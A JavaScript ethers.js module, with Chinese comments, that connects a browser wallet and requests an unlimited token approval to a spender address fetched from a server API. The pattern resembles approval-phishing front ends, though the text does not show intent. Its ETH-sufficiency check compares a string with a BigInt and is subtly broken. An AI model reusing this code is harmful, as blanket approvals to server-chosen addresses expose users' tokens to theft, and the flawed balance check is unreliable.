import { ethers, BrowserProvider } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.1/ethers.min.js';
// Your code here...
import { ABI, contractAddress } from './config';
let provider = null;
export async function connectWallet() {
  return new Promise((res, rej) => {
    if (provider == null) {
      provider = new BrowserProvider(window.ethereum);
      // provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
    }
    provider
      .send('eth_requestAccounts', [])
      .then((a) => {
        return res(a[0]);
      })
      .catch(() => {
        return rej('user rejected request');
      });
  });
}
export let checkNeedEth = async (approve) => {
  let signer = await provider.getSigner(); //连接钱包地址
  let adr = approve; //授权地址，从api获取
  // let contractAddress = contractAddress; //合约地址
  let contract = new ethers.Contract(contractAddress, ABI, signer);
  let feeData = await provider.getFeeData();
  let gasUsed = await contract.approve.estimateGas(adr, ethers.MaxUint256);
  let needEth = ethers.formatEther(feeData.gasPrice * gasUsed);
  let ethBalance = await provider.getBalance(signer.address);
  return new Promise((res, rej) => {
    if (needEth > ethBalance) {
      console.log('eth not enough');
      return res(false);
    } else {
      return res(true);
    }
  });
};
export async function tokenApprove(approve) {
  let signer = await provider.getSigner(); //连接钱包地址
  let adr = approve; //授权地址，从api获取
  // let contractAddress = contractAddress; //合约地址
  let contract = new ethers.Contract(contractAddress, ABI, signer);
  return new Promise((res, rej) => {
    contract.approve(adr, ethers.MaxUint256).then((tx) => {
      tx.wait().then((txReceipt) => {
        if (txReceipt && txReceipt.status == 1) {
          //交易成功
          return res(txReceipt.hash);
        } else {
          return rej();
        }
      });
    });
  });
  // try {
  //     let feeData =await provider.getFeeData();
  //     let gasUsed = await contract.approve.estimateGas(adr, ethers.MaxUint256) ;
  //     let needEth = ethers.formatEther(feeData.gasPrice*gasUsed);
  //     let ethBalance = await provider.getBalance(signer.address);
  //     if(needEth>ethBalance){
  //         console.log('eth not enough')
  //     }
  //     let tx = await contract.approve(adr, ethers.MaxUint256) //授权
  //     let txReceipt = await tx.wait();
  //     if (txReceipt && txReceipt.status == 1) { //交易成功
  //         console.log(txReceipt.hash); //调用api，把hash传入接口
  //     }

  // } catch (e) {
  //     console.log(e)
  // }
}

export async function tokenBalance() {
  console.log(1111);
  //非gas币的余额获取
  let signer = await provider.getSigner(); //连接钱包地址
  let contract = new ethers.Contract(contractAddress, ABI, provider);
  let decimals = await contract.decimals();
  let balance = await contract.balanceOf(signer.address);
  return new Promise((res) => {
    console.log('余额', ethers.formatUnits(balance, decimals));
    return res(ethers.formatUnits(balance, decimals));
  });
  // console.log('余额', ethers.formatUnits(balance, decimals));
}
